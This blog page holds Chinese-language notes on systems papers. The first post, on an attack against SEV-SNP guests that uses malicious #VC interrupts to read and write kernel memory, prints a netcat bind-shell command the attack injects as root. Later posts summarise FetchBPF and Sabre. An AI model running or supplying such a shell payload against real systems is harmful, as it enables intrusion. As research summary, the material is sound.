<h3 id="Simple-attack"><a href="#Simple-attack" class="headerlink" title="Simple attack"></a>Simple attack</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmVjZGJjM2RmNDU4MGFjZTZmNzUwMzc2ZDViOGQ1NjVfWEQ0QXBab0Z5aTUyaDBxa3JYYmF1YVIxRjhhQ25NRzVfVG9rZW46V0dJcGJKZTdEb0JqeUx4Z2d2YmNEdUFHbjFlXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFhZGRlODIxYWVhYTE0NjQ0OTE4N2ExMGU1ZjcxODNfWGo0cERFWVFQWUppVEN0THhZYjNuWEFiWTllMW1FMFRfVG9rZW46WTdxN2I2TnZob0dZZUJ4dDlWNWM3WWxZbnNiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<h3 id="VC-ability"><a href="#VC-ability" class="headerlink" title="VC ability"></a>VC ability</h3><ul>
<li>Chaining multiple #VC</li>
<li>Nesting #VC in non-critical section</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzk1NGJkYmM5N2Q5MGFmODhhNDhiZDRiZmQzZDBhNzhfQ0tlSE1ZMUg5YTlQV0k5dmdTZnVsVW1iYjRIOEtXUTVfVG9rZW46VDVSa2J4TThEb2hVUlV4NjQwN2N3Qk55bkw3XzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NzYxYTZkYzVlYWYxNzY0YjgzMzBhN2NmODQyY2I5YjlfeTF3TUZEYkx2NkVSa2sxdDFGM2V5OHdpS3NieW5CclpfVG9rZW46Vnc2VWJKZnIxb243VDB4MjJxOWNVSFFBbnBoXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>只用vmmcall和mmio read&#x2F;write 三种情况就可以构造足够强大的attack primitives</p>
<h2 id="Attack-Primitives"><a href="#Attack-Primitives" class="headerlink" title="Attack Primitives"></a>Attack Primitives</h2><p>利用vanilla linux内vc_handler的处理逻辑配合恶意#VC中断实现更强大的功能。</p>
<h3 id="Skip-Instructions"><a href="#Skip-Instructions" class="headerlink" title="Skip Instructions"></a>Skip Instructions</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTE1ZjViOTExZDljM2MzYmNmYmI3ZDcwNDBmNmU5YjJfWnM3WklhcXN6SmFudzJ6R2lnbHRteHNXV2M2ZzVtM0NfVG9rZW46WlNmbWJiOUZib0R1cTZ4dk1JMGNpcVBsbk5mXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>guest的VC handler根据hypervisor的处理结果：</p>
<ul>
<li>OK：增加rip（执行下一行指令）</li>
<li>RETRY：不增加rip（重新执行一遍原指令）</li>
</ul>
<p>exit_reason为vmmcall，rax不进行修改，返回success</p>
<p>记为S</p>
<h3 id="Read-Write-Rax"><a href="#Read-Write-Rax" class="headerlink" title="Read&amp;Write Rax"></a>Read&amp;Write Rax</h3><ul>
<li>exit_reason为vmmcall，rax进行修改，返回success-&gt;记为 WraxS</li>
<li>利用nesting VC 跳过line8-line13，共15行汇编，(WraxS).15S &#x3D; Wrax</li>
</ul>
<h3 id="Reading-Kernel-Memory"><a href="#Reading-Kernel-Memory" class="headerlink" title="Reading Kernel Memory"></a>Reading Kernel Memory</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov [rdi], rbx</span><br></pre></td></tr></table></figure>

<p>hypervisor需要rdi指向地址的值与rbx的值</p>
<ul>
<li>并不是直接mov rbx到GHCB，而是有另一块内存（context）进行中转</li>
<li>中转的过程中会使用rax保存rbx的值所在的内存地址，然后用memcpy复制到GHCB</li>
<li>利用Wrax修改rax指向guest secret va，memcpy会把secret 拷贝到GHCB暴露给hypervisor</li>
<li>利用Wrax绕过后续的检查</li>
</ul>
<p>记为Rmem</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmFkYTlkZGJkZjA4YzFiZDA2ZTdmODMzZTA0NDIxZTJfOWVLZGd3cDlRV0M5YWV2NkdvcUVaR21HVGxlM1czTUNfVG9rZW46SnFHdmJqY216b0gzMEt4UDRIemN3aXRnbkhiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<h3 id="Writing-Kernel-Memory"><a href="#Writing-Kernel-Memory" class="headerlink" title="Writing Kernel Memory"></a>Writing Kernel Memory</h3><p>Wmem原理同Rmem</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rbx, [rdi]</span><br></pre></td></tr></table></figure>

<p>guest需要把hypervisor提供的值放到寄存器rbx中</p>
<ul>
<li>并不是直接把GHCB内存mov到rbx，而是有另一块内存（context）进行中转</li>
<li>中转的过程中会使用rax保存rbx的值所在的内存地址，然后用memcpy复制到这块地址</li>
<li>利用Wrax修改rax指向guest target va，memcpy会把hypervisor准备的恶意值拷贝到guest私有内存</li>
<li>利用Wrax绕过检查</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTA5YmNjNDUyYjQ1NmEyY2EyNjUyOTc4YzNiOWUxMGZfYkp2NEVuVUx5RmRFVHBmc2NVTG9sZ3hoSjFlZUViNDRfVG9rZW46S0JuTmJvWEpSb1o0NDd4MElnOWNzd3FpbnVkXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<h3 id="Arbitrary-Code-Injection"><a href="#Arbitrary-Code-Injection" class="headerlink" title="Arbitrary Code Injection"></a>Arbitrary Code Injection</h3><p>目标：往.text section注入恶意的shellcode</p>
<ul>
<li>提前静态分析，得到内核页表基地址所在地址（不考虑地址随机化的情况下）</li>
<li>Rmem读出页表基地址（CR3的值），Wmem改页表权限</li>
</ul>
<h2 id="Problems-To-be-Solved"><a href="#Problems-To-be-Solved" class="headerlink" title="Problems To be Solved"></a>Problems To be Solved</h2><h3 id="Where-To-Inject-？"><a href="#Where-To-Inject-？" class="headerlink" title="Where To Inject ？"></a>Where To Inject ？</h3><p>绕过ASLR</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ODI1NDEwNDNhYWJhMDA0YjllMjBjMTFkN2VmOTJlOTNfOHhxSjJSRUlJZ3VLUzZVRThwTFZOdk9Hd28ydUZYTHFfVG9rZW46WDJjaGJNWUdGb2tLeE14TzRoN2NKcW1CbmhmXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<ul>
<li>kernel在地址随机化之前，早期的地址是固定的。</li>
<li>提前分析得出kernel在地址随机化之前的最后一个page地址 （0x7a753000）</li>
<li>运行时，这个page之后的page地址就可以计算出随机的PKbase</li>
</ul>
<h3 id="When-To-Inject？"><a href="#When-To-Inject？" class="headerlink" title="When To Inject？"></a>When To Inject？</h3><ul>
<li>离线采样得到page序列，同之前的攻击（Heckler等）</li>
<li>运行时hypervisor修改stage2页表权限，通过page fault得到guest正在执行的page 序列</li>
<li>直接通过guest的符号表可以找到函数对应的固定地址（同PKbase进行计算）</li>
</ul>
<h2 id="Case-studies"><a href="#Case-studies" class="headerlink" title="Case studies"></a>Case studies</h2><h3 id="Leaking-keys-from-Kernel-TLS"><a href="#Leaking-keys-from-Kernel-TLS" class="headerlink" title="Leaking keys from Kernel TLS"></a>Leaking keys from Kernel TLS</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWNiMGVhNjM3MWI0ODhhZmVhNzQwYjZlNzk3YjE5ZDVfT0pHdXQ2WFpJajZTOVgxRUV6M1VMam9QZDd0VmpIT2JfVG9rZW46WGtBSmJmNnh6b0xOdXB4bDhyV2Mxb01xbndiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<h3 id="Disabling-Firewall"><a href="#Disabling-Firewall" class="headerlink" title="Disabling Firewall"></a>Disabling Firewall</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTI3YzJlNWY5MTRkYThjYmFhMGI5ZTM3MGI0YzUxMzRfM1haVkVXbzlONnhsYTJhTEdGNE1QQTNqTTZuR0Z1eG9fVG9rZW46UnNjSWJDUTExb0VJVjV4QmxodWNacmpWbkZiXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>改16bytes</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVjNTY2Nzc5YzY4NjQ3MTNlMDUzMDQ4MTQzNTBlYmZfSEU2eGZZRHZLT1ZtNmMzQWVpTmlGNHpVNnZXWnpNNkZfVG9rZW46TjhqM2JwekJ3bzBJNGp4MVlDN2M0dGNCbjliXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>绕过所有iptables的规则</p>
<h3 id="Gaining-a-Root-Shell-in-the-SEV-SNP-VM"><a href="#Gaining-a-Root-Shell-in-the-SEV-SNP-VM" class="headerlink" title="Gaining a Root Shell in the SEV-SNP VM"></a>Gaining a Root Shell in the SEV-SNP VM</h3><p>利用kernel API：call_usermodehelper</p>
<p>以root权限创建一个用户态进程，参数为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c rm /tmp/t; mknod /tmp/t p;</span><br><span class="line">/bin/sh 0&lt;/tmp/t \| nc -ln 8001 1&gt;/tmp/t</span><br></pre></td></tr></table></figure>

<p>创建一个root shell并通过8001端口向外通信</p>
<p>作者将这段逻辑构造为shellcode （392bytes）并注入到icmp_rcv中，可以通过ping触发</p>
<p>暂时无法在飞书文档外展示此内容</p>
<h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><ul>
<li>SEV-SNP</li>
<li>Linux kernel v6.5.0</li>
<li>Ubuntu 20.04.6 LTS</li>
<li>QEMU v8.0.0</li>
</ul>
<h3 id="Primitives"><a href="#Primitives" class="headerlink" title="Primitives"></a>Primitives</h3><ul>
<li>216450 instruction skips&#x2F;s </li>
<li>9.25 memory reads&#x2F;s</li>
<li>8.95 memory writes&#x2F;s</li>
</ul>
<h3 id="Case-studies-1"><a href="#Case-studies-1" class="headerlink" title="Case studies"></a>Case studies</h3><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDAxNmM3ZTg1MjljMGNlMTMzZmNlMTI2NmRlNjc3ZTBfd0U2alJKZnFXUVh3RGs5dVlOZWpCTEt2MGNObU1UVWhfVG9rZW46UXNHOGI0WGdHb0xNNkp4TG13SWNLWDEybndjXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p>分别需要5.97 0.36 8.1s</p>
<h2 id="Defense"><a href="#Defense" class="headerlink" title="Defense"></a>Defense</h2><p><a target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=e3ef461af35a8c74f2f4ce6616491ddb355a208f">x86&#x2F;sev: Harden #VC instruction emulation somewhat</a></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YzM1ZTVlMzE1ZTIxZDcxMDMxMTkzNjZkZjQ4NDljNjFfQnhkN1BIdHFoVFRpbUtGcTg5dmxkNTU3UEpKcFh4NFZfVG9rZW46WFkzOWJBU3l6b2xtVHl4a3NRVGNBcVBDbjBnXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWFjYTcwY2I5MDNmMTkzMjRiMDE3MDYyYTUzZmQ2MzdfcjJZc3BPU1pwV1NYTUlOcWY3eG1mU0QzeXN5MlMyS0xfVG9rZW46S0tXMGJTVWFFb0tBRGN4WUh4WGN1MXAxbjRlXzE3Mzg2NzMyODM6MTczODY3Njg4M19WNA" alt="img"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2025/02/04/papers/FetchBPF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/02/04/papers/FetchBPF/" class="post-title-link" itemprop="url">FetchBPF: Customizable Prefetching Policies in Linux with eBPF</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-02-04 20:45:13 / Modified: 20:53:17" itemprop="dateCreated datePublished" datetime="2025-02-04T20:45:13+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>935</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>3 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="FetchBPF-Customizable-Prefetching-Policies-in-Linux-with-eBPF"><a href="#FetchBPF-Customizable-Prefetching-Policies-in-Linux-with-eBPF" class="headerlink" title="FetchBPF: Customizable Prefetching Policies in Linux with eBPF"></a>FetchBPF: Customizable Prefetching Policies in Linux with eBPF</h1><p>ATC’24</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg4YWYzNDI2Y2E2ZGNjZDliMDRhNTgwNTU1ZmZlMDJfWDFTczE1UVBzYkswT2dlQ3Y4ekdHUlhPUmp1MVpzNXJfVG9rZW46SFJSbGJyeEpBb2F1aVR4YzlEcWMzOHhabnJnXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<p>基于eBPF设计了一个框架，使得用户可以定制自己的memory prefetch策略</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>linux的某些策略平均表现很好，但是很难在特定的情况下取得最好的性能。</p>
<h3 id="Memory-prefetching"><a href="#Memory-prefetching" class="headerlink" title="Memory prefetching"></a>Memory prefetching</h3><p>内存压力大时，内存页会被swap out，之后需要用时，swap in会很慢</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZmOWIyOWFhNDg0NTRhMDhlNTZhZGRlMTIyM2M5N2RfODdJWE95ZW02M0dDaGdEREJSTzg5TzhYSHBicTFzRHJfVG9rZW46UXA2R2JhdzVEb2VjYkx4cTMzdWNvc0ZBblFoXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<p>为了提高性能，操作系统会预测哪些swapped out的pages可能会被用到，prefetch这些pages</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJkNGY3OGUzZDMyNDY4NDVlYTE4ZTc4OGE5MTIxNjhfZERmWmI3S001RXpLem5QdGFPVXRaUmtvU0NkMXNKckFfVG9rZW46R3RYcGJxNXFub2N2MGZ4alNxY2NJYlhKbnJmXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<p>一个好的prefetch策略需要兼顾Accuracy与Coverage：</p>
<ul>
<li>Coverage：cache hits &#x2F; (cache hits + cache misses) 尽可能让之后可能发生的page fault的pages都被prefetch到</li>
<li>Accuracy：cache hits &#x2F; prefetch pages 需要保证不能prefetch太多没用的page 反而拖慢了性能</li>
</ul>
<h4 id="Linux-default-prefetch-policy"><a href="#Linux-default-prefetch-policy" class="headerlink" title="Linux default prefetch policy"></a>Linux default prefetch policy</h4><ul>
<li>只考虑sequantial pattern</li>
<li>只看过去2个page fault，如果连续，则prefetch连续的后几个pages</li>
</ul>
<h4 id="SOTA-prefetch-policy"><a href="#SOTA-prefetch-policy" class="headerlink" title="SOTA prefetch policy"></a>SOTA prefetch policy</h4><ul>
<li>LEAP：ATC‘20</li>
<li>HoPP：HPCA‘23</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ4M2EzZGE2MjU0Njc5NWY0MDRhOGFkMWVhNDg1NTJfRTVNY2dFZ241M3Z0Q2FIWmlIY2ljNWpaZlM3UDhVaDBfVG9rZW46T2lLbWJwa2VOb2FXQWR4Y0VmTWNxZkZSbnZiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Y4NDdlZmJlMjI5Y2E0NzY4ZGZlOTJjMDU5ZmQ1NWFfZGl5cGF1MXB2WmVqbUdNcElWTjVQUGJNeEJub290N3BfVG9rZW46QXVlM2JDdnZZbzNHSzB4NlVOOWNZSllLblFiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<h4 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h4><p>不同allocation pattern和不同access pattern下 各个memory prefetch policy的性能表现</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MmI4MjIyYjk4ZjI5Yjc5YTRkMTE1NzJiY2JiOGFiYTJfUklQWFZpUkFJVjZmOXNNOVVrdWFDV3dkcEViQXhzdUhfVG9rZW46QWo3QmJaZGQ2b0hVZTl4YXVJS2N6Ykg0bkpoXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<p>结论：没有一个policy会在任何条件下比其他的policy都好。需要最适合某个application，必须为这个application定制policy</p>
<h3 id="eBPF"><a href="#eBPF" class="headerlink" title="eBPF"></a>eBPF</h3><blockquote>
<p>eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。</p>
</blockquote>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MzdhY2I4MzY3NTUwZGM1YjI1MDNjYjBlOTk3MjRmOTNfUlhRWnNGMnQyWGNnOFVPMWZ1a3hnY1EyMEplSWZLMFpfVG9rZW46VTU1Y2IzQVpHb0lTaUR4QlFMT2NDVXR0bjJjXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<h2 id="Strawman-design"><a href="#Strawman-design" class="headerlink" title="Strawman design"></a>Strawman design</h2><p>改linux 实现多种prefetch policy ，根据历史的memory access pattern进行动态切换</p>
<p>问题</p>
<ol>
<li>难以支持任意数量的policy</li>
<li>很难存在一个特定的policy集合 可以适应所有的access pattern</li>
<li>在linux中实现工程量大</li>
<li>需要说服linux上游接受 需要耗费更多精力和时间</li>
</ol>
<h2 id="Design-and-implementation"><a href="#Design-and-implementation" class="headerlink" title="Design and implementation"></a>Design and implementation</h2><p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFmMTBhNDY2NWIxOGUyNGQ3MjUxMmMwM2ZlOWI2YjNfU3NrQ3ptdTI5MjhoQW96RVBtWXZkNVBmY3h3dTZmVXVfVG9rZW46U3BmTmJzRjFXb2N5cDF4MkNPZmNBWFpmbkplXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<h3 id="eBPF-Hook"><a href="#eBPF-Hook" class="headerlink" title="eBPF Hook"></a>eBPF Hook</h3><ul>
<li>(A)prefetch_stats：page fault时触发，用于记录fault pages的历史信息，便于policy找到access pattern</li>
<li>(B)prefetch_policy：执行prefetch policy时触发，需要根据算法找到需要prefetch的pages并且请求prefetch 这些pages</li>
</ul>
<h3 id="Helper-Functions"><a href="#Helper-Functions" class="headerlink" title="Helper Functions"></a>Helper Functions</h3><ul>
<li>(1)bpf_prefetch_physical_page：根据物理地址发出I&#x2F;O请求</li>
<li>(2)bpf_prefetch_virtual_page：根据虚拟地址发出I&#x2F;O请求</li>
<li>(3)bpf_&lt;start&#x2F;stop&gt;_block_plug：选择性batch上两个接口发出的I&#x2F;O请求</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4MDBhYTVlODYyZGE3N2ZkYzVmZjkyYjljNDNlYmRfN0xlQ3pFZE1JTWo2Mk9kZ1RGTnJhcmFGZTZYcE9xN1RfVG9rZW46TTA4UmJ1WlJZb2xIU0F4ZVdURmNqczRPblRmXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<h3 id="Policy-example-LEAP"><a href="#Policy-example-LEAP" class="headerlink" title="Policy example(LEAP)"></a>Policy example(LEAP)</h3><ul>
<li>eBPF map: 存储memory access history</li>
<li>prefetch_stats: 在map中存入page fault地址以及与前一个page fault地址的差</li>
<li>prefetch_policy：用Boyer-Moore识别出majority stride，调用bpf_prefetch_physical_page进行prefetch</li>
</ul>
<h2 id="Evaluation"><a href="#Evaluation" class="headerlink" title="Evaluation"></a>Evaluation</h2><h3 id="Microbenchmarks"><a href="#Microbenchmarks" class="headerlink" title="Microbenchmarks"></a>Microbenchmarks</h3><p>分配5GB array</p>
<p>Allocation patterns：</p>
<ul>
<li>Sequential allocation（sqn）</li>
<li>Random allocation（random）：模拟多个线程同时alloc pages （这种情况使用virtual address会比physical address好）</li>
</ul>
<p>Access patterns：</p>
<ul>
<li>Sequential（sqn）</li>
<li>stride（stride）：相隔3 pages</li>
<li>ladder（ladder）：increasing stride</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDY1N2ExNWVmOWI1MDE3OWViZjgzZWI2YjE1MjU5ZWRfTVNNZ0Q5SHdYNlNkSGYzaldUNnpkUk9TbGRFbm5vM0ZfVG9rZW46SDFBMmJpRWREb0VCR1R4TGtsZ2Nwd1hFbnZlXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<ul>
<li>Accuracy、Coverage： eBPF实现版本与linux kernel版本几乎完全一致</li>
<li>Execution time：eBPF带来的overhead可以忽略不计</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZkY2UzZTNiZDgzZTM0Yjg2MTIwNjA4OWM4MmVjODJfcUE2Z3NCQW5PVTBXV2t3dkY4WmFnZ1NwVVF3aTNTOWpfVG9rZW46QWRFbmJzblRib2UyTm14eUhVemNkSWVVbmFiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<ul>
<li>latency大部分的开销在page retrieval （I&#x2F;O）</li>
<li>eBPF程序被JIT编译为机器指令，性能与kernel functions差别不大</li>
</ul>
<h3 id="Macrobenchmarks"><a href="#Macrobenchmarks" class="headerlink" title="Macrobenchmarks"></a>Macrobenchmarks</h3><ul>
<li>VoltDB上运行TPC-C</li>
<li>Redis’ memtier benchmark</li>
<li>Twitter dataset上运行PageRank与betweeness centrality</li>
</ul>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc4NDQzYWNhMTExYzVjN2I3NjdjYWFlNjU4ZWRhOGNfbVl2U0ZpaVpNWG9JRU52ZzNNUXhHMmF0ZThuVEo1YUtfVG9rZW46TmZkZ2JhWWg1bzBINll4UFNsaGM2YzU4bmdwXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA" alt="img"></p>
<ul>
<li>对比policy及与之对应的eBPF版本，仍然没有明显的性能差别</li>
<li>好的policy在可用内存少时优势更明显</li>
</ul>
<p>关于VMA policy作者的解释：这些对性能要求极高的程序耗费了大量的时间为linux的prefetch policy做了优化</p>
<p>FetchBPF希望改变这种方式，设计policy去适配application，而不是优化application的访存模式去适配policy</p>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文基于eBPF设计了框架FetchBPF，使得用户可以根据程序的访存模式自定义内存预取策略来达到最优的性能。FetchBPF框架可以在几乎没有额外性能开销的情况下达到一致的内存预取功能。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2025/02/04/papers/Sabre/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/02/04/papers/Sabre/" class="post-title-link" itemprop="url">Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs </a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-02-04 20:44:14 / Modified: 20:53:17" itemprop="dateCreated datePublished" datetime="2025-02-04T20:44:14+08:00">2025-02-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>5 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs"><a href="#Sabre-Hardware-Accelerated-Snapshot-Compression-for-Serverless-MicroVMs" class="headerlink" title="Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs"></a>Sabre: Hardware-Accelerated Snapshot Compression for Serverless MicroVMs</h1><p>OSDI24</p>
<p><img src="https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MTNkYmUwZDlhYjFmN2RkMWZjY2EzMThhMzRmMGM0NDNfN3RIV0RvUkZZb1JvQTJzdk1IekhNam0wOWF2N3NWTGVfVG9rZW46QWpiZ2JBaVhIb0FLQnR4T0h3UGNzN0VRbjJlXzE3Mzg2NzI5Nzc6MTczODY3NjU3N19WNA" alt="img"></p>
<p>利用硬件加速器IAA压缩VM snapshot，优化serverless场景下microVM cold start慢的问题</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>问题：serverless场景下microVM冷启动 启动时间久</p>
<ul>
<li>解决方案：采用VM snapshot 把guest VM memory存到文件里 下次读文件恢复而不是从头启动</li>
</ul>
<p>问题：如果存了整个guest memory restore的时候全部load进去太大了</p>
<ul>
<li>解决方案: on-demand paging，触发page fault才映射 和传统进程&#x2F;VM 一样 （现有系统如firecracker采用的方式 baseline1）</li>
</ul>
<p>问题：page fault导致性能差</p>
<ul>
<li>解决方案：prefetch 预测工作集（working set）<ul>
<li>REAP（record-and-replay）是asplops21加速snapshot的方案，提出用working set记录一次function call的pages prefetch这些page （SOTA方案 baseline2）</li>
</ul>
</li>
</ul>
<p>snapshot和WS file的大小很影响效率 越小性能越好 </p>
<ul>
<li>解决方案：压缩</li>
</ul>
<p>问题：解压缩占时间 且在cold start关键路径上</p>
<h2 id="IAA"><a href="#IAA" class="headerlink" title="IAA"></a>IAA</h2><h3 id="IAA介绍"><a href="#IAA介绍" class="headerlink" title="IAA介绍"></a>IAA介绍</h3><p>Intel In-Memory Analytic Accelerator 集成在CPU SoC上的一个PCIe设备</p>
<p>用户态应用向IAA工作队列提交请求</p>
<p>目前主要用在数据库上</p>
